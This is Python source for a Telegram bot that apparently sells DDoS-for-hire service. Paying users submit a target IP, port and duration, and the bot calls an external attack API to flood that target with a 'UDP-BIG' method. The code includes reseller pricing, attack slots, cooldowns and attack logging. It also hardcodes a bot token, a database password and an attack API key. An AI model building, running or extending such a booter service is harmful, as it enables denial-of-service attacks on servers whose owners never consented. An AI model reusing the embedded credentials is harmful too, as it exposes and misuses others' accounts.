import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import sys
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import requests
import psutil
from collections import defaultdict
import json

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ===== CONFIGURATION =====
BOT_TOKEN = "8870086516:AAGRKVPrqWGA38zk_Ryz-gGTHpMPjQAueVM"
MONGO_URL = "mongodb+srv://gb824083_db_user:chzG3YUsv2Z7ukmx@gauravxddos.ajue9og.mongodb.net/?appName=GAURAVXDDOS"
BOT_OWNER = 6539807903
PAID_CONTACT = "@GAURAV_BHAI1"  # PAID CONTACT FOR GROUP USERS

print("Connecting to MongoDB...", flush=True)
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    groups_collection = db['groups']
    
    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)
    
    print("MongoDB connected successfully!", flush=True)
except Exception as e:
    print(f"MongoDB connection error: {e}", flush=True)
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# ===== FIXED SETTINGS FUNCTIONS =====
def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            value = setting['value']
            if key == 'api_list' and isinstance(value, str):
                try:
                    parsed = json.loads(value)
                    if isinstance(parsed, list):
                        return parsed
                except:
                    pass
            return value
        return default
    except:
        return default

def set_setting(key, value):
    if key == 'api_list' and isinstance(value, list):
        value = json.dumps(value)
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )

# ===== FIXED API MANAGEMENT SYSTEM =====
def get_api_list():
    saved_apis = get_setting('api_list', None)
    
    if saved_apis and isinstance(saved_apis, list) and saved_apis:
        valid_apis = []
        for api in saved_apis:
            if isinstance(api, dict) and 'url' in api:
                valid_apis.append(api)
        if valid_apis:
            return valid_apis
    
    default_apis = [
        {
            'id': 0,
            'url': 'http://mahakalddos.duckdns.org/mahakal.php?key=@mahakal1814&ip={ip}&port={port}&time={duration}',
            'name': 'GAURAV',
            'enabled': True,
            'usage_count': 0,
            'success_count': 0,
            'fail_count': 0,
            'added_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        },
        {
            'id': 1,
            'url': 'http://mahakalddos.duckdns.org/mahakal.php?key=@mahakal1814&ip={ip}&port={port}&time={duration}',
            'name': 'PAPA',
            'enabled': True,
            'usage_count': 0,
            'success_count': 0,
            'fail_count': 0,
            'added_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    ]
    set_api_list(default_apis)
    return default_apis

def set_api_list(apis):
    set_setting('api_list', apis)

def add_api(url, name="API"):
    apis = get_api_list()
    for api in apis:
        if api['url'] == url:
            return False, "API already exists!"
    
    new_api = {
        'id': len(apis),
        'url': url,
        'name': name,
        'enabled': True,
        'usage_count': 0,
        'success_count': 0,
        'fail_count': 0,
        'added_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    apis.append(new_api)
    set_api_list(apis)
    return True, f"API '{name}' added successfully! Total APIs: {len(apis)}"

def remove_api(api_id):
    apis = get_api_list()
    for i, api in enumerate(apis):
        if api['id'] == api_id:
            removed = apis.pop(i)
            set_api_list(apis)
            return True, f"API '{removed['name']}' removed!"
    return False, "API not found!"

def toggle_api(api_id):
    apis = get_api_list()
    for api in apis:
        if api['id'] == api_id:
            api['enabled'] = not api['enabled']
            set_api_list(apis)
            status = "ENABLED ✅" if api['enabled'] else "DISABLED ❌"
            return True, f"API '{api['name']}' {status}!"
    return False, "API not found!"

def update_api_stats(api_index, success=True):
    apis = get_api_list()
    if 0 <= api_index < len(apis):
        apis[api_index]['usage_count'] = apis[api_index].get('usage_count', 0) + 1
        if success:
            apis[api_index]['success_count'] = apis[api_index].get('success_count', 0) + 1
        else:
            apis[api_index]['fail_count'] = apis[api_index].get('fail_count', 0) + 1
        set_api_list(apis)

def test_api(api_id):
    apis = get_api_list()
    for api in apis:
        if api['id'] == api_id:
            try:
                test_url = api['url'].format(ip='127.0.0.1', port=80, duration=5)
                response = requests.get(test_url, timeout=10)
                if response.status_code == 200:
                    return True, f"API is working! Status: {response.status_code}"
                else:
                    return False, f"API returned status: {response.status_code}"
            except Exception as e:
                return False, f"API error: {str(e)}"
    return False, "API not found!"

def get_enabled_apis():
    apis = get_api_list()
    if isinstance(apis, list):
        return [api for api in apis if isinstance(api, dict) and api.get('enabled', True)]
    return []

def reset_api_stats(api_id=None):
    apis = get_api_list()
    if api_id is None:
        for api in apis:
            api['usage_count'] = 0
            api['success_count'] = 0
            api['fail_count'] = 0
        set_api_list(apis)
        return True, "All API stats reset!"
    else:
        for api in apis:
            if api['id'] == api_id:
                api['usage_count'] = 0
                api['success_count'] = 0
                api['fail_count'] = 0
                set_api_list(apis)
                return True, f"API '{api['name']}' stats reset!"
        return False, "API not found!"

# ===== REQUIRED CHANNELS =====
REQUIRED_CHANNELS = [
    "https://t.me/DESTROYDDOSLODER",
]

def extract_channel_username(url):
    if url.startswith("https://t.me/"):
        return url.replace("https://t.me/", "").strip()
    elif url.startswith("t.me/"):
        return url.replace("t.me/", "").strip()
    return url.strip()

REQUIRED_CHANNEL_USERNAMES = [extract_channel_username(ch) for ch in REQUIRED_CHANNELS]

# ===== RESELLER PRICING =====
RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

# ===== DEFAULT SETTINGS =====
DEFAULT_PRIVATE_MAX_ATTACK_TIME = 300
DEFAULT_GROUP_MAX_ATTACK_TIME = 60
DEFAULT_PRIVATE_COOLDOWN = 30
DEFAULT_GROUP_COOLDOWN = 120

def update_reseller_pricing():
    for dur in RESELLER_PRICING:
        saved_price = get_setting(f'price_{dur}', None)
        if saved_price is not None:
            RESELLER_PRICING[dur]['price'] = saved_price

update_reseller_pricing()

def get_private_max_attack_time():
    try:
        return int(get_setting('private_max_attack_time', DEFAULT_PRIVATE_MAX_ATTACK_TIME))
    except:
        return DEFAULT_PRIVATE_MAX_ATTACK_TIME

def get_group_max_attack_time():
    try:
        return int(get_setting('group_max_attack_time', DEFAULT_GROUP_MAX_ATTACK_TIME))
    except:
        return DEFAULT_GROUP_MAX_ATTACK_TIME

def get_private_cooldown():
    try:
        return int(get_setting('private_cooldown', DEFAULT_PRIVATE_COOLDOWN))
    except:
        return DEFAULT_PRIVATE_COOLDOWN

def get_group_cooldown():
    try:
        return int(get_setting('group_cooldown', DEFAULT_GROUP_COOLDOWN))
    except:
        return DEFAULT_GROUP_COOLDOWN

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai. Baad mein try karo.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

# ===== CHANNEL JOIN REQUIRED SETTINGS =====
def get_channel_required():
    return get_setting('channel_required', True)

def set_channel_required(enabled):
    set_setting('channel_required', enabled)

# ===== DDOS PROTECTION SETTINGS =====
def get_ddos_protection():
    return get_setting('ddos_protection', True)

def set_ddos_protection(enabled):
    set_setting('ddos_protection', enabled)

# ===== GROUP APPROVAL SYSTEM =====
def get_approved_groups():
    return get_setting('approved_groups', [])

def add_approved_group(group_id):
    approved = get_approved_groups()
    if group_id not in approved:
        approved.append(group_id)
        set_setting('approved_groups', approved)
        return True
    return False

def remove_approved_group(group_id):
    approved = get_approved_groups()
    if group_id in approved:
        approved.remove(group_id)
        set_setting('approved_groups', approved)
        return True
    return False

def is_group_approved(group_id):
    approved = get_approved_groups()
    return group_id in approved

# ===== REEL FEATURE =====
def get_reel_enabled():
    return get_setting('reel_enabled', True)

def set_reel_enabled(enabled):
    set_setting('reel_enabled', enabled)

def get_reel_list():
    reels = get_setting('reel_list', [])
    return reels if isinstance(reels, list) else []

def add_reel(file_id):
    reels = get_reel_list()
    if file_id not in reels:
        reels.append(file_id)
        set_setting('reel_list', reels)
        return True
    return False

def remove_reel(index):
    reels = get_reel_list()
    if 0 <= index < len(reels):
        removed = reels.pop(index)
        set_setting('reel_list', reels)
        return removed
    return None

def get_random_reel():
    reels = get_reel_list()
    if reels:
        return random.choice(reels)
    return None

# ===== ANTI-DDOS PROTECTION =====
class DDOSProtection:
    def __init__(self):
        self.user_requests = defaultdict(list)
        self.chat_requests = defaultdict(list)
        self.blocked_users = set()
        self.global_counter = 0
        self.global_reset = time.time()
        self.attack_history = defaultdict(list)
        self.enabled = True
        
    def is_ddos_attack(self, user_id, chat_id):
        if not self.enabled:
            return False
        now = time.time()
        if user_id in self.blocked_users:
            return True
        if now - self.global_reset > 1:
            self.global_counter = 0
            self.global_reset = now
        self.global_counter += 1
        if self.global_counter > 30:
            print(f"🌐 Global rate limit exceeded: {self.global_counter} RPS")
            time.sleep(0.1)
            return True
        self.user_requests[user_id] = [t for t in self.user_requests[user_id] if now - t < 5]
        if len(self.user_requests[user_id]) >= 5:
            self.blocked_users.add(user_id)
            print(f"🚫 Blocked spammer user: {user_id}")
            return True
        self.chat_requests[chat_id] = [t for t in self.chat_requests[chat_id] if now - t < 5]
        if len(self.chat_requests[chat_id]) >= 20:
            print(f"📊 Chat rate limit: {len(self.chat_requests[chat_id])} req/5s")
            time.sleep(0.05)
            return True
        self.user_requests[user_id].append(now)
        self.chat_requests[chat_id].append(now)
        return False

protection = DDOSProtection()

def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        bot.reply_to(message, get_maintenance_msg())
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one({'user_id': user_id}, {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}})
                return False
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            bot.reply_to(message, f"🚫 𝗧𝗨𝗠 𝗧𝗘𝗠𝗣𝗢𝗥𝗔𝗥𝗬 𝗕𝗔𝗡 𝗛𝗢!\n\n⏳ Expiry: {expiry_str}\n❌ Tum abhi kuch nahi kar sakte.\n\n📞 Contact Your Seller")
            return True
        bot.reply_to(message, f"🚫 𝗧𝗨𝗠 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧 𝗕𝗔𝗡 𝗛𝗢!\n\n❌ Tum kuch nahi kar sakte.\n\n📞 Contact Your Seller")
        return True
    return False

def check_channel_join(message):
    if not get_channel_required():
        return True
    user_id = message.from_user.id
    if user_id == BOT_OWNER or is_reseller(user_id):
        return True
    not_joined = []
    for channel_username in REQUIRED_CHANNEL_USERNAMES:
        try:
            chat_member = bot.get_chat_member(f"@{channel_username}", user_id)
            if chat_member.status not in ['member', 'administrator', 'creator']:
                not_joined.append(f"@{channel_username}")
        except Exception as e:
            print(f"⚠️ Channel check error for {channel_username}: {e}")
            not_joined.append(f"@{channel_username}")
    if not_joined:
        channels_text = "\n".join([f"• {ch}" for ch in not_joined])
        bot.reply_to(message, 
            f"❌ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟!\n\n"
            f"Attack karne se pehle ye channel join karo:\n\n{channels_text}\n\n"
            f"Join karne ke baad /verify use karke confirm karo.\n"
            f"Phir /attack command use karo.\n\n"
            f"📢 Channel: {', '.join(REQUIRED_CHANNEL_USERNAMES)}"
        )
        return False
    return True

def check_group_approval(message):
    chat_id = message.chat.id
    if message.chat.type in ['private', 'personal']:
        return True
    if message.from_user.id == BOT_OWNER:
        return True
    if is_group_approved(chat_id):
        return True
    bot.reply_to(message, 
        f"❌ 𝗚𝗥𝗢𝗨𝗣 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗!\n\n"
        f"This group is not approved for attacks.\n\n"
        f"📢 Group ID: `{chat_id}`\n\n"
        f"Contact owner to approve this group.\n"
        f"Owner can use: /addgrp {chat_id}",
        parse_mode="Markdown"
    )
    return False

_attack_lock = threading.Lock()

def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one({'_id': user['_id']}, {'$set': {'key_expiry': new_expiry}})
            time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            time.sleep(10)

extender_thread = threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

active_attacks = {}
user_cooldowns = {}
api_in_use = {}
user_attack_history = {}
bot_start_time = datetime.now()

pending_feedback = {}

def set_pending_feedback(user_id, target, port, duration):
    pending_feedback[user_id] = {"target": target, "port": port, "duration": duration, "timestamp": datetime.now()}

def get_pending_feedback(user_id):
    return pending_feedback.get(user_id)

def clear_pending_feedback(user_id):
    if user_id in pending_feedback:
        del pending_feedback[user_id]

def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None

def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')
    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')
    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')
    return None, None

def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    if not user or not user.get('key_expiry'):
        return False
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    return True

def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_user_cooldown(user_id, is_group=False):
    with _attack_lock:
        if user_id not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[user_id]
            return 0
        return int(remaining)

def set_user_cooldown(user_id, is_group=False):
    with _attack_lock:
        cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        return len(active_attacks)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_max_concurrent():
    return len(get_enabled_apis())

def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        
        busy_indices = set(api_in_use.values())
        enabled_apis = get_enabled_apis()
        
        for i in range(len(enabled_apis)):
            if i not in busy_indices:
                return i
        return None

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def send_long_message(message, text, parse_mode=None):
    max_length = 4000
    if len(text) <= max_length:
        if parse_mode:
            bot.reply_to(message, text, parse_mode=parse_mode)
        else:
            bot.reply_to(message, text)
    else:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > max_length:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for i, part in enumerate(parts):
            try:
                if i == 0:
                    if parse_mode:
                        bot.reply_to(message, part, parse_mode=parse_mode)
                    else:
                        bot.reply_to(message, part)
                else:
                    if parse_mode:
                        bot.send_message(message.chat.id, part, parse_mode=parse_mode)
                    else:
                        bot.send_message(message.chat.id, part)
                time.sleep(0.3)
            except:
                pass

def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass

def call_single_api(slot_index, api_url, target, port, duration, api_id=None):
    success = False
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            success = True
        print(f"[API Slot {slot_index+1}] Target: {target}:{port} | Status: {response.status_code} | Response: {response.text[:100]}", flush=True)
    except Exception as e:
        print(f"[API Slot {slot_index+1}] Target: {target}:{port} | Error: {e}", flush=True)
    
    if api_id is not None:
        update_api_stats(api_id, success)

# ===== UI GENERATORS =====
def generate_global_status_ui():
    get_active_attack_count()
    attacks = list(active_attacks.items())
    total_slots = len(get_enabled_apis())
    used_slots = len(attacks)
    free_slots = total_slots - used_slots
    
    enabled_apis = get_enabled_apis()
    api_names = []
    for api in enabled_apis:
        name = api.get('name', f'API-{api["id"]}')
        status = "🟢" if api.get('enabled', True) else "🔴"
        api_names.append(f"{status}{name}")
    
    api_list = ", ".join(api_names) if api_names else "No APIs"
    feedback_status = "🔴 ON" if len(pending_feedback) > 0 else "🟢 OFF"
    
    if not attacks:
        return f'''╔══════════════════════════╗
║  🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦  🔥       ║
╠══════════════════════════╣
║  📊 Active: 0/{total_slots}        ║
║  🌐 APIs: {api_list} ║
║  ⚙️ Max Time: {get_private_max_attack_time()}s       ║
║  📸 Feedback: {feedback_status}       ║
╚══════════════════════════╝

💤 Koi active attack nahi

⚡ Private: {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s
⚡ Groups: {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s
🔢 Free Slots: {free_slots}/{total_slots}'''
    
    header = f'''╔══════════════════════════╗
║  🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦  🔥       ║
╠══════════════════════════╣
║  📊 Active: {used_slots}/{total_slots}        ║
║  🌐 APIs: {api_list} ║
║  ⚙️ Max Time: {get_private_max_attack_time()}s       ║
║  📸 Feedback: {feedback_status}       ║
╠══════════════════════════╣
'''
    body = ""
    for idx, (attack_id, info) in enumerate(attacks[:10], 1):
        remaining = (info['end_time'] - datetime.now()).total_seconds()
        if remaining < 0:
            continue
        total_dur = info['duration']
        elapsed = total_dur - remaining
        percent = int((elapsed / total_dur) * 100) if total_dur > 0 else 0
        filled = int(percent / 10)
        empty = 10 - filled
        bar = "█" * filled + "░" * empty
        
        target_str = f"{info['target']}:{info['port']}"
        if len(target_str) > 20:
            target_str = target_str[:18] + ".."
        
        body += f'''║  {idx}. 🎯 {target_str:<20} ║
║     ⏱️ {int(remaining):<3}s  {bar} {percent:>3}% ║
'''
    if len(attacks) > 10:
        body += f'''║  ... {len(attacks)-10} more attacks{' ' * (20 - len(str(len(attacks)-10)) - 12)} ║
'''
    footer = f'''
╚══════════════════════════╝

⚡ Private: {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s
⚡ Groups: {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s
🔢 Free Slots: {free_slots}/{total_slots}'''
    return header + body + footer

def generate_attack_start_ui(target, port, duration, cooldown, method="UDP-BIG", slot=1, total_slots=10):
    enabled_apis = get_enabled_apis()
    api_name = "Unknown"
    if slot-1 < len(enabled_apis):
        api_name = enabled_apis[slot-1].get('name', f'API-{slot}')
    
    target_str = f"{target}:{port}"
    if len(target_str) > 20:
        target_str = target_str[:18] + ".."
    
    return f'''╔══════════════════════════╗
║  ⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗  ⚡       ║
╠══════════════════════════╣
║  🎯 {target_str:<20} ║
║  ⚡ {method:<20} ║
║  ⏱️ {duration:<3}s {' ' * 17} ║
║  🔄 Slot: {slot}/{total_slots:<5} {' ' * 10} ║
║  🌐 API: {api_name:<16} ║
║  ⏳ Cooldown: {cooldown:<3}s {' ' * 15} ║
╚══════════════════════════╝

📊 /status - Check active attacks
👑 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗘𝗟𝗜𝗧𝗘 𝗦𝗘𝗥𝗩𝗘𝗥𝗦'''

def generate_attack_complete_ui(target, port, duration, cooldown, method="UDP-BIG"):
    target_str = f"{target}:{port}"
    if len(target_str) > 20:
        target_str = target_str[:18] + ".."
    
    return f'''╔══════════════════════════╗
║  ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅     ║
╠══════════════════════════╣
║  🎯 {target_str:<20} ║
║  ⚡ {method:<20} ║
║  ⏱️ {duration:<3}s {' ' * 17} ║
║  ⏳ Cooldown: {cooldown:<3}s {' ' * 15} ║
╚══════════════════════════╝

📸 Send screenshot to enable next attack!
👑 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗘𝗟𝗜𝗧𝗘 𝗦𝗘𝗥𝗩𝗘𝗥𝗦'''

def start_attack(target, port, duration, message, attack_id, api_index, is_group=False):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        log_attack(user_id, username, target, port, duration)
        if not is_owner(user_id):
            set_pending_feedback(user_id, target, port, duration)
        cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
        method = "UDP-BIG"
        total_slots = len(get_enabled_apis())
        slot_number = api_index + 1
        
        attack_start_msg = generate_attack_start_ui(target, port, duration, cooldown_time, method, slot_number, total_slots)
        
        try:
            if get_reel_enabled():
                reel_id = get_random_reel()
                if reel_id:
                    bot.send_video(
                        message.chat.id,
                        reel_id,
                        caption=attack_start_msg,
                        supports_streaming=True
                    )
                else:
                    if is_owner(user_id):
                        bot.reply_to(message, f"👑 Owner\n{attack_start_msg}")
                    else:
                        bot.reply_to(message, attack_start_msg)
            else:
                if is_owner(user_id):
                    bot.reply_to(message, f"👑 Owner\n{attack_start_msg}")
                else:
                    bot.reply_to(message, attack_start_msg)
        except Exception as e:
            print(f"Reel send error: {e}")
            if is_owner(user_id):
                bot.reply_to(message, f"👑 Owner\n{attack_start_msg}")
            else:
                bot.reply_to(message, attack_start_msg)
        
        enabled_apis = get_enabled_apis()
        if api_index < len(enabled_apis):
            api = enabled_apis[api_index]
            api_url = api['url'].format(ip=target, port=port, duration=duration)
            api_id = api['id']
            api_name = api.get('name', f'API-{api_index}')
            print(f"[API] Using: {api_name} - {api_url}", flush=True)
            
            try:
                t = threading.Thread(target=call_single_api, args=(api_index, api_url, target, port, duration, api_id))
                t.daemon = True
                t.start()
            except Exception as e:
                print(f"[API Slot {api_index+1}] Launch Error: {e}", flush=True)
        
        time.sleep(duration)
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            remaining_cooldown = 0
            if user_id in user_cooldowns:
                remaining_cooldown = max(0, int((user_cooldowns[user_id] - datetime.now()).total_seconds()))
        
        complete_msg = generate_attack_complete_ui(target, port, duration, remaining_cooldown, method)
        
        try:
            if get_reel_enabled():
                reel_id = get_random_reel()
                if reel_id:
                    bot.send_video(
                        message.chat.id,
                        reel_id,
                        caption=complete_msg,
                        supports_streaming=True
                    )
                else:
                    if is_owner(user_id):
                        bot.reply_to(message, f"👑 Owner Complete\n{complete_msg}")
                    else:
                        bot.reply_to(message, complete_msg)
            else:
                if is_owner(user_id):
                    bot.reply_to(message, f"👑 Owner Complete\n{complete_msg}")
                else:
                    bot.reply_to(message, complete_msg)
        except Exception as e:
            print(f"Reel send error: {e}")
            if is_owner(user_id):
                bot.reply_to(message, f"👑 Owner Complete\n{complete_msg}")
            else:
                bot.reply_to(message, complete_msg)
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        print(f"Attack error: {e}", flush=True)

# ============================================================
# ===== API MANAGEMENT COMMANDS =====
# ============================================================

@bot.message_handler(commands=['addapi'])
def add_api_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /addapi <url> [name]\n\nExample: /addapi http://api.com/attack?key=KEY&ip={ip}&port={port}&time={duration} MyAPI\n\nPlaceholders: {ip}, {port}, {duration}")
        return
    
    url = parts[1]
    name = parts[2] if len(parts) > 2 else f"API-{len(get_api_list()) + 1}"
    
    if '{ip}' not in url or '{port}' not in url or '{duration}' not in url:
        bot.reply_to(message, "❌ URL mein {ip}, {port}, aur {duration} placeholders hone chahiye!")
        return
    
    success, msg = add_api(url, name)
    bot.reply_to(message, f"{'✅' if success else '❌'} {msg}")

@bot.message_handler(commands=['removeapi'])
def remove_api_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /removeapi <id>\nUse /listapis to see IDs")
        return
    
    try:
        api_id = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid ID!")
        return
    
    success, msg = remove_api(api_id)
    bot.reply_to(message, f"{'✅' if success else '❌'} {msg}")

@bot.message_handler(commands=['toggleapi'])
def toggle_api_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /toggleapi <id>")
        return
    
    try:
        api_id = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid ID!")
        return
    
    success, msg = toggle_api(api_id)
    bot.reply_to(message, f"{'✅' if success else '❌'} {msg}")

@bot.message_handler(commands=['testapi'])
def test_api_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /testapi <id>")
        return
    
    try:
        api_id = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid ID!")
        return
    
    status_msg = bot.reply_to(message, "⏳ Testing API...")
    success, msg = test_api(api_id)
    bot.edit_message_text(
        f"{'✅' if success else '❌'} {msg}",
        chat_id=status_msg.chat.id,
        message_id=status_msg.message_id
    )

